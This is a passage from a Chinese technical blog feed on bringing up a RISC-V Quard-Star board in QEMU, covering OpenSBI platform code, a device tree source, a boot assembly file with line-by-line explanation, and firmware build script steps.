function_">quard_star_pmu_xlate_to_mhpmevent</span><span class="params">(<span class="type">uint32_t</span> event_idx,</span></span><br><span class="line"><span class="params">					       <span class="type">uint64_t</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint64_t</span> evt_val = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* data is valid only for raw events and is equal to event selector */</span></span><br><span class="line">	<span class="keyword">if</span> (event_idx == SBI_PMU_EVENT_RAW_IDX)</span><br><span class="line">		evt_val = data;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * Generic platform follows the SBI specification recommendation</span></span><br><span class="line"><span class="comment">		 * i.e. zero extended event_idx is used as mhpmevent value for</span></span><br><span class="line"><span class="comment">		 * hardware general/cache events if platform does&#x27;t define one.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		evt_val = fdt_pmu_get_select_value(event_idx);</span><br><span class="line">		<span class="keyword">if</span> (!evt_val)</span><br><span class="line">			evt_val = (<span class="type">uint64_t</span>)event_idx;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> evt_val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> u64 <span class="title function_">quard_star_tlbr_flush_limit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> SBI_PLATFORM_TLB_RANGE_FLUSH_LIMIT_DEFAULT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>platform结构体</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sbi_platform</span> <span class="title">platform</span> =</span> &#123;</span><br><span class="line">	.opensbi_version	= OPENSBI_VERSION,                      <span class="comment">// 版本号</span></span><br><span class="line">	.platform_version	= SBI_PLATFORM_VERSION(<span class="number">0x0</span>, <span class="number">0x01</span>),      <span class="comment">// 平台的版本号</span></span><br><span class="line">	.name				= <span class="string">&quot;Quard-Star&quot;</span>,  						<span class="comment">// 平台名称</span></span><br><span class="line">	.features			= SBI_PLATFORM_DEFAULT_FEATURES,		<span class="comment">// 平台默认特征</span></span><br><span class="line">	.hart_count			= SBI_HARTMASK_MAX_BITS,  				<span class="comment">// 平台的处理器（hart，riscv叫做hart）数量</span></span><br><span class="line">	.hart_index2id		= quard_star_hart_index2id,				<span class="comment">// 指向处理器标识符数组的指针，用于索引到唯一的处理器标识符</span></span><br><span class="line">	.hart_stack_size	= SBI_PLATFORM_DEFAULT_HART_STACK_SIZE, <span class="comment">// 指定了每个 hart的默认堆栈大小</span></span><br><span class="line">	.platform_ops_addr	= (<span class="type">unsigned</span> <span class="type">long</span>)&amp;platform_ops			<span class="comment">// 平台操作函数的指针，用于指定平台操作函数的地址</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-5-设备树</title>
    <url>/2024/06/08/riscv-5-%E8%AE%BE%E5%A4%87%E6%A0%91/</url>
    <content><![CDATA[<h1 id="1-设备树介绍"><a href="#1-设备树介绍" class="headerlink" title="1.设备树介绍"></a>1.设备树介绍</h1><blockquote>
<p>参考：</p>
<ol>
<li><a href="https://blog.csdn.net/qq_52479948/article/details/132127885">Linux——设备树_linux 设备树-CSDN博客</a></li>
<li><a href="https://yanglianoo.github.io/2023/06/11/%E8%AE%BE%E5%A4%87%E6%A0%91%E8%AF%A6%E8%A7%A3/">设备树详解 | TimerのBlog (yanglianoo.github.io)</a></li>
</ol>
</blockquote>
<p><strong>设备树：</strong>是一种描述硬件的数据结构，提供一种语言将硬件配置从Linux内核源码中提取出来，使得目标板和设备变成数据驱动的，它们必须基于传递给内核的数据进行初始化。</p>
<p>设备树文件 使用一种<code>”Device Tree Source”（DTS）</code>的语言编写，文件描述了硬件设备的层次结构，寄存器地址，中断线路，DMA通道和其他的相关属性。</p>
<p>设备树文件 经过<code>DTC</code>编译后会生成一种称为”Device Tree Blob”（DTB）的二进制格式。DTB文件在引导过程中由引导加载程序（Bootloader）提供给内核。内核会解析DTB文件，根据其中的描述信息初始化硬件设备，并加载相应的驱动程序。</p>
<p>名词解释：</p>
<ul>
<li><code>DTS</code>device tree source ，.dts文件，是一种ASCII 文本格式的文件，一般一个文件对应一个硬件平台</li>
<li><strong><code>DTC</code>：</strong>device tree complier 编译设备树源码的编译工具，一般情况下需要手动安装这个编译工具 </li>
<li><code>DTB</code>：device tree bin 生成的编译文件</li>
</ul>
<p><img src="/2024/06/08/riscv-5-%E8%AE%BE%E5%A4%87%E6%A0%91/image-20240609150607554.png" alt="image-20240609150607554"></p>
<h1 id="2-编写quard-star的设备树文件"><a href="#2-编写quard-star的设备树文件" class="headerlink" title="2.编写quard_star的设备树文件"></a>2.编写quard_star的设备树文件</h1><p>新建dts文件夹和quard_star_sbi.dts</p>
<blockquote>
<p>dts&#x2F;quard_star_sbi.dts</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#address-cells = &lt;0x2&gt;;</span><br><span class="line">#size-cells = &lt;0x2&gt;;</span><br><span class="line">compatible = &quot;riscv-quard-star&quot;;</span><br><span class="line">model = &quot;riscv-quard-star,qemu&quot;;</span><br><span class="line"></span><br><span class="line">chosen &#123;</span><br><span class="line">	stdout-path = &quot;/soc/uart0@10000000&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">memory@80000000 &#123;</span><br><span class="line">	device_type = &quot;memory&quot;;</span><br><span class="line">	reg = &lt;0x0 0x80000000 0x0 0x40000000&gt;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>compatible属性</strong>：属性值类型：字符串,<ul>
<li>compatible是系统用来决定绑定到设备的设备驱动的关键。 compatible属性是用来查找节点的方法之一，另外还可以通过节点名或节点路径查找指定节点。</li>
</ul>
</li>
<li><strong>model属性</strong>：属性值类型：字符串<ul>
<li>model属性用于指定设备的制造商和型号，推荐使用“制造商, 型号”的格式，当然也可以自定义。</li>
</ul>
</li>
<li><strong>reg属性</strong><ul>
<li>reg属性描述设备资源在其父总线定义的地址空间内的地址。通常情况下用于表示一块内存的起始地址（偏移地址）和长度，</li>
</ul>
</li>
<li><strong>chosen子节点</strong>：chosen子节点位于根节点下，<ul>
<li>chosen子节点不代表实际硬件，它主要用于给内核传递参数。 这里设置了uart0</li>
</ul>
</li>
</ul>
<p>总的代码，定义了CPU uart 中断等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/dts-v1/;</span><br><span class="line"></span><br><span class="line">/ &#123;</span><br><span class="line">	#address-cells = &lt;0x2&gt;;</span><br><span class="line">	#size-cells = &lt;0x2&gt;;</span><br><span class="line">	compatible = &quot;riscv-quard-star&quot;;</span><br><span class="line">	model = &quot;riscv-quard-star,qemu&quot;;</span><br><span class="line"></span><br><span class="line">	chosen &#123;</span><br><span class="line">		stdout-path = &quot;/soc/uart0@10000000&quot;;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	memory@80000000 &#123;</span><br><span class="line">		device_type = &quot;memory&quot;;</span><br><span class="line">		reg = &lt;0x0 0x80000000 0x0 0x40000000&gt;;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	cpus &#123;</span><br><span class="line">		#address-cells = &lt;0x1&gt;;</span><br><span class="line">		#size-cells = &lt;0x0&gt;;</span><br><span class="line">		timebase-frequency = &lt;0x989680&gt;;</span><br><span class="line"></span><br><span class="line">		cpu0: cpu@0 &#123;</span><br><span class="line">			phandle = &lt;0xf&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x0&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0x10&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu1: cpu@1 &#123;</span><br><span class="line">			phandle = &lt;0xd&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x1&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0xe&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu2: cpu@2 &#123;</span><br><span class="line">			phandle = &lt;0xb&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x2&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0xc&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu3: cpu@3 &#123;</span><br><span class="line">			phandle = &lt;0x9&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x3&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0xa&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu4: cpu@4 &#123;</span><br><span class="line">			phandle = &lt;0x7&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x4&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0x8&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu5: cpu@5 &#123;</span><br><span class="line">			phandle = &lt;0x5&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x5&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0x6&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu6: cpu@6 &#123;</span><br><span class="line">			phandle = &lt;0x3&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x6&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0x4&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu7: cpu@7 &#123;</span><br><span class="line">			phandle = &lt;0x1&gt;;</span><br><span class="line">			device_type = &quot;cpu&quot;;</span><br><span class="line">			reg = &lt;0x7&gt;;</span><br><span class="line">			status = &quot;okay&quot;;</span><br><span class="line">			compatible = &quot;riscv&quot;;</span><br><span class="line">			riscv,isa = &quot;rv64imafdcsu&quot;;</span><br><span class="line">			mmu-type = &quot;riscv,sv48&quot;;</span><br><span class="line"></span><br><span class="line">			interrupt-controller &#123;</span><br><span class="line">				#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">				interrupt-controller;</span><br><span class="line">				compatible = &quot;riscv,cpu-intc&quot;;</span><br><span class="line">				phandle = &lt;0x2&gt;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		cpu-map &#123;</span><br><span class="line"></span><br><span class="line">			cluster0 &#123;</span><br><span class="line"></span><br><span class="line">				core0 &#123;</span><br><span class="line">					cpu = &lt;0xf&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line"></span><br><span class="line">				core1 &#123;</span><br><span class="line">					cpu = &lt;0xd&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line"></span><br><span class="line">				core2 &#123;</span><br><span class="line">					cpu = &lt;0xb&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line"></span><br><span class="line">				core3 &#123;</span><br><span class="line">					cpu = &lt;0x9&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line"></span><br><span class="line">				core4 &#123;</span><br><span class="line">					cpu = &lt;0x7&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line"></span><br><span class="line">				core5 &#123;</span><br><span class="line">					cpu = &lt;0x5&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line"></span><br><span class="line">				core6 &#123;</span><br><span class="line">					cpu = &lt;0x3&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line"></span><br><span class="line">				core7 &#123;</span><br><span class="line">					cpu = &lt;0x1&gt;;</span><br><span class="line">				&#125;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	soc &#123;</span><br><span class="line">		#address-cells = &lt;0x2&gt;;</span><br><span class="line">		#size-cells = &lt;0x2&gt;;</span><br><span class="line">		compatible = &quot;simple-bus&quot;;</span><br><span class="line">		ranges;</span><br><span class="line"></span><br><span class="line">		uart0: uart0@10000000 &#123;</span><br><span class="line">			interrupts = &lt;0xa&gt;;</span><br><span class="line">			interrupt-parent = &lt;0x11&gt;;</span><br><span class="line">			clock-frequency = &lt;0x384000&gt;;</span><br><span class="line">			reg = &lt;0x0 0x10000000 0x0 0x1000&gt;;</span><br><span class="line">			compatible = &quot;ns16550a&quot;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		uart1: uart1@10001000 &#123;</span><br><span class="line">			interrupts = &lt;0xa&gt;;</span><br><span class="line">			interrupt-parent = &lt;0x11&gt;;</span><br><span class="line">			clock-frequency = &lt;0x384000&gt;;</span><br><span class="line">			reg = &lt;0x0 0x10001000 0x0 0x1000&gt;;</span><br><span class="line">			compatible = &quot;ns16550a&quot;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">        uart2: uart2@10002000 &#123;</span><br><span class="line">			interrupts = &lt;0xa&gt;;</span><br><span class="line">			interrupt-parent = &lt;0x11&gt;;</span><br><span class="line">			clock-frequency = &lt;0x384000&gt;;</span><br><span class="line">			reg = &lt;0x0 0x10002000 0x0 0x1000&gt;;</span><br><span class="line">			compatible = &quot;ns16550a&quot;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		plic@c000000 &#123;</span><br><span class="line">			phandle = &lt;0x11&gt;;</span><br><span class="line">			riscv,ndev = &lt;0x35&gt;;</span><br><span class="line">			reg = &lt;0x0 0xc000000 0x0 0x210000&gt;;</span><br><span class="line">			interrupts-extended = &lt;0x10 0xb 0x10 0x9 0xe 0xb 0xe 0x9 0xc 0xb 0xc 0x9 0xa 0xb 0xa 0x9 0x8 0xb 0x8 0x9 0x6 0xb 0x6 0x9 0x4 0xb 0x4 0x9 0x2 0xb 0x2 0x9&gt;;</span><br><span class="line">			interrupt-controller;</span><br><span class="line">			compatible = &quot;riscv,plic0&quot;;</span><br><span class="line">			#interrupt-cells = &lt;0x1&gt;;</span><br><span class="line">			#address-cells = &lt;0x0&gt;;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		clint@2000000 &#123;</span><br><span class="line">			interrupts-extended = &lt;0x10 0x3 0x10 0x7 0xe 0x3 0xe 0x7 0xc 0x3 0xc 0x7 0xa 0x3 0xa 0x7 0x8 0x3 0x8 0x7 0x6 0x3 0x6 0x7 0x4 0x3 0x4 0x7 0x2 0x3 0x2 0x7&gt;;</span><br><span class="line">			reg = &lt;0x0 0x2000000 0x0 0x10000&gt;;</span><br><span class="line">			compatible = &quot;riscv,clint0&quot;;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h1 id="3-start-s重新编写"><a href="#3-start-s重新编写" class="headerlink" title="3.start.s重新编写"></a>3.start.s重新编写</h1><p>start.s需要重新编写用于引导加载opensbi固件以及设备树，然后跳转到DRAM执行opensbi</p>
<blockquote>
<p>boot&#x2F;start.s</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.macro loop,cunt</span><br><span class="line">    li		t1,	0xffff</span><br><span class="line">    li		t2,	\cunt</span><br><span class="line">1:</span><br><span class="line">	nop</span><br><span class="line">	addi    t1, t1, -1</span><br><span class="line">	bne		t1, x0, 1b</span><br><span class="line">    li		t1,	0xffff</span><br><span class="line">	addi    t2, t2, -1</span><br><span class="line">	bne		t2, x0, 1b</span><br><span class="line">	.endm</span><br><span class="line"></span><br><span class="line">	.macro load_data,_src_start,_dst_start,_dst_end</span><br><span class="line">	bgeu	\_dst_start, \_dst_end, 2f</span><br><span class="line">1:</span><br><span class="line">	lw      t0, (\_src_start)</span><br><span class="line">	sw      t0, (\_dst_start)</span><br><span class="line">	addi    \_src_start, \_src_start, 4</span><br><span class="line">	addi    \_dst_start, \_dst_start, 4</span><br><span class="line">	bltu    \_dst_start, \_dst_end, 1b</span><br><span class="line">2:</span><br><span class="line">	.endm</span><br><span class="line"></span><br><span class="line">	.section .text</span><br><span class="line">	.globl _start</span><br><span class="line">	.type _start,@function</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">	//load opensbi_fw.bin </span><br><span class="line">	//[0x20200000:0x20400000] --&gt; [0x80000000:0x80200000]</span><br><span class="line">    li		a0,	0x202</span><br><span class="line">	slli	a0,	a0, 20      //a0 = 0x20200000</span><br><span class="line">    li		a1,	0x800</span><br><span class="line">	slli	a1,	a1, 20      //a1 = 0x80000000</span><br><span class="line">    li		a2,	0x802</span><br><span class="line">	slli	a2,	a2, 20      //a2 = 0x80200000</span><br><span class="line">	load_data a0,a1,a2</span><br><span class="line"></span><br><span class="line">	//load qemu_sbi.dtb</span><br><span class="line">	//[0x20080000:0x20100000] --&gt; [0x82200000:0x82280000]</span><br><span class="line">    li		a0,	0x2008</span><br><span class="line">	slli	a0,	a0, 16       //a0 = 0x20080000</span><br><span class="line">    li		a1,	0x822</span><br><span class="line">	slli	a1,	a1, 20       //a1 = 0x82200000</span><br><span class="line">    li		a2,	0x8228</span><br><span class="line">	slli	a2,	a2, 16       //a2 = 0x82280000</span><br><span class="line">	load_data a0,a1,a2</span><br><span class="line"></span><br><span class="line">    csrr    a0, mhartid</span><br><span class="line">    li		t0,	0x0     </span><br><span class="line">	beq		a0, t0, _no_wait</span><br><span class="line">	loop	0x1000</span><br><span class="line">_no_wait:</span><br><span class="line">    li		a1,	0x822</span><br><span class="line">	slli	a1,	a1, 20       //a1 = 0x82200000</span><br><span class="line">    li	    t0,	0x800</span><br><span class="line">	slli	t0,	t0, 20       //t0 = 0x80000000</span><br><span class="line">    jr      t0</span><br><span class="line"></span><br><span class="line">    .end</span><br></pre></td></tr></table></figure>



<p><strong>解析：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.macro loop,cunt</span><br><span class="line">    li		t1,	0xffff  # 将0xffff 加载到寄存器他</span><br><span class="line">    li		t2,	\cunt   # 将参数 cunt 的值加载到寄存器 t2 </span><br><span class="line">1:</span><br><span class="line">	nop					# 空操作</span><br><span class="line">	addi    t1, t1, -1  # t1 减 1</span><br><span class="line">	bne		t1, x0, 1b	# x0是riscv的零寄存器，值始终为0。如果 t1 不等于零，跳回标签 1，继续循环。 ben（非等）</span><br><span class="line">    li		t1,	0xffff	# 重置</span><br><span class="line">	addi    t2, t2, -1 	# t2 寄存器 减一</span><br><span class="line">	bne		t2, x0, 1b</span><br><span class="line">	.endm</span><br></pre></td></tr></table></figure>

<ul>
<li><code>loop</code>宏，这里定义了一个双重循环，用于执行一个固定次数的空操作。宏接收一个参数 <code>cunt</code> 表示外层循环数 t1是内存循环数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.macro load_data,_src_start,_dst_start,_dst_end</span><br><span class="line">	bgeu	\_dst_start, \_dst_end, 2f  		# 如果 _dst_start &gt;= _dst_end，跳到标签 2</span><br><span class="line">1:</span><br><span class="line">	lw      t0, (\_src_start)					# 从 _src_start 加载一个字到 t0 lw load word</span><br><span class="line">	sw      t0, (\_dst_start)					# 将 t0 存储到 _dst_start</span><br><span class="line">	addi    \_src_start, \_src_start, 4			# 将 _src_start 增加 4</span><br><span class="line">	addi    \_dst_start, \_dst_start, 4			# 将 _dst_start 增加 4</span><br><span class="line">	bltu    \_dst_start, \_dst_end, 1b			# 如果 _dst_start &lt; _dst_end，跳回标签 1</span><br><span class="line">2:</span><br><span class="line">	.endm</span><br></pre></td></tr></table></figure>

<p><code>load_data</code>宏，定义了一个从源地址加载数据到目标地址的循环，直到目标地址到达结束地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line">.type _start, @function</span><br></pre></td></tr></table></figure>

<ul>
<li><code>.section .text</code>：定义代码段（.text 段），用于存放可执行代码。</li>
<li><code>.globl _start</code>：声明 <code>_start</code> 标签为全局符号，使其在链接时可见。</li>
<li><code>.type _start, @function</code>：指定 <code>_start</code> 为函数类型</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//load opensbi_fw.bin </span><br><span class="line">//[0x20200000:0x20400000] --&gt; [0x80000000:0x80200000]</span><br><span class="line">   li		a0,	0x202</span><br><span class="line">slli	a0,	a0, 20      //a0 = 0x20200000 左移20位</span><br><span class="line">   li		a1,	0x800</span><br><span class="line">slli	a1,	a1, 20      //a1 = 0x80000000</span><br><span class="line">   li		a2,	0x802</span><br><span class="line">slli	a2,	a2, 20      //a2 = 0x80200000</span><br><span class="line">load_data a0,a1,a2</span><br></pre></td></tr></table></figure>

<ul>
<li>加载opensbi固件</li>
<li><strong>load_data a0, a1, a2</strong>: 调用宏 <code>load_data</code>，将从 <code>0x20200000</code> 到 <code>0x20400000</code> 的数据复制到 <code>0x80000000</code> 到 <code>0x80200000</code>。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//load qemu_sbi.dtb</span><br><span class="line">//[0x20080000:0x20100000] --&gt; [0x82200000:0x82280000]</span><br><span class="line">   li		a0,	0x2008</span><br><span class="line">slli	a0,	a0, 16       //a0 = 0x20080000</span><br><span class="line">   li		a1,	0x822</span><br><span class="line">slli	a1,	a1, 20       //a1 = 0x82200000</span><br><span class="line">   li		a2,	0x8228</span><br><span class="line">slli	a2,	a2, 16       //a2 = 0x82280000 左移16位</span><br><span class="line">load_data a0,a1,a2</span><br></pre></td></tr></table></figure>

<ul>
<li>加载qemu sbi 设备树</li>
<li><strong>load_data a0, a1, a2</strong>: 调用宏 <code>load_data</code>，将从 <code>0x20080000</code> 到 <code>0x20100000</code> 的数据复制到 <code>0x82200000</code> 到 <code>0x82280000</code>。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	csrr    a0, mhartid</span><br><span class="line">    li		t0,	0x0     </span><br><span class="line">	beq		a0, t0, _no_wait</span><br><span class="line">	loop	0x1000</span><br><span class="line">_no_wait:</span><br><span class="line">    li		a1,	0x822</span><br><span class="line">	slli	a1,	a1, 20       //a1 = 0x82200000</span><br><span class="line">    li	    t0,	0x800</span><br><span class="line">	slli	t0,	t0, 20       //t0 = 0x80000000</span><br><span class="line">    jr      t0</span><br></pre></td></tr></table></figure>

<ul>
<li><p>检查当前hart，</p>
</li>
<li><p><strong>csrr a0, mhartid</strong>: 读取当前 hart ID（硬件线程 ID）到寄存器 <code>a0</code>。</p>
<p><strong>li t0, 0x0</strong>: 将 <code>0</code> 加载到寄存器 <code>t0</code>。</p>
<p><strong>beq a0, t0, _no_wait</strong>: 如果 <code>a0</code> 等于 <code>t0</code>（即当前 hart ID 为 0），跳转到 <code>_no_wait</code> 标签。</p>
<p><strong>loop 0x1000</strong>: 否则，执行一个循环（定义在上面的 <code>loop</code> 宏中），大约等待一段时间。</p>
</li>
<li><p>nowait</p>
</li>
<li><p><strong>li a1, 0x822</strong>: 将 <code>0x822</code> 加载到寄存器 <code>a1</code> 中。</p>
<p><strong>slli a1, a1, 20</strong>: 将 <code>a1</code> 左移 20 位，使其值变为 <code>0x82200000</code>。 —设备树</p>
<p><strong>li t0, 0x800</strong>: 将 <code>0x800</code> 加载到寄存器 <code>t0</code> 中。</p>
<p><strong>slli t0, t0, 20</strong>: 将 <code>t0</code> 左移 20 位，使其值变为 <code>0x80000000</code>。 —opensbi</p>
<p><strong>jr t0</strong>: 跳转到 <code>t0</code>（即 <code>0x80000000</code>）处，开始执行新程序。 —opensbi</p>
</li>
</ul>
<p><strong>总结，这段代码实现了以下功能：</strong></p>
<ol>
<li>将 OpenSBI 固件从 <code>0x20200000</code> 复制到 <code>0x80000000</code>。</li>
<li>将 QEMU SBI 设备树从 <code>0x20080000</code> 复制到 <code>0x82200000</code>。</li>
<li>检查当前 hart ID，如果不是 0，则执行一个等待循环。</li>
<li>跳转到 <code>0x80000000</code> 处，执行新的程序。</li>
</ol>
<h1 id="4-build-sh和-run-sh修改"><a href="#4-build-sh和-run-sh修改" class="headerlink" title="4.build.sh和 run.sh修改"></a>4.build.sh和 run.sh修改</h1><blockquote>
<p>build.sh</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">---------------------------编译opensbi-----------------------------</span></span><br><span class="line">echo &quot;------------------------- 编译opensbi-----------------------------&quot;</span><br><span class="line">if [ ! -d &quot;$SHELL_FOLDER/output/opensbi&quot; ]; then  </span><br><span class="line">mkdir $SHELL_FOLDER/output/opensbi</span><br><span class="line">fi  </span><br><span class="line">cd $SHELL_FOLDER/opensbi-1.2</span><br><span class="line">make CROSS_COMPILE=$CROSS_PREFIX- PLATFORM=quard_star</span><br><span class="line">cp -r $SHELL_FOLDER/opensbi-1.2/build/platform/quard_star/firmware/*.bin $SHELL_FOLDER/output/opensbi/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成sbi.dtb</span></span><br><span class="line">cd $SHELL_FOLDER/dts</span><br><span class="line">dtc -I dts -O dtb -o $SHELL_FOLDER/output/opensbi/quard_star_sbi.dtb quard_star_sbi.dts</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">合成firmware固件</span></span><br><span class="line">if [ ! -d &quot;$SHELL_FOLDER/output/fw&quot; ]; then  </span><br><span class="line">mkdir $SHELL_FOLDER/output/fw</span><br><span class="line">fi  </span><br><span class="line">cd $SHELL_FOLDER/output/fw</span><br><span class="line">rm -rf fw.bin</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">填充 32K的0</span></span><br><span class="line">dd of=fw.bin bs=1k count=32k if=/dev/zero   </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="comment"># 写入 lowlevel_fw.bin 偏移量地址为 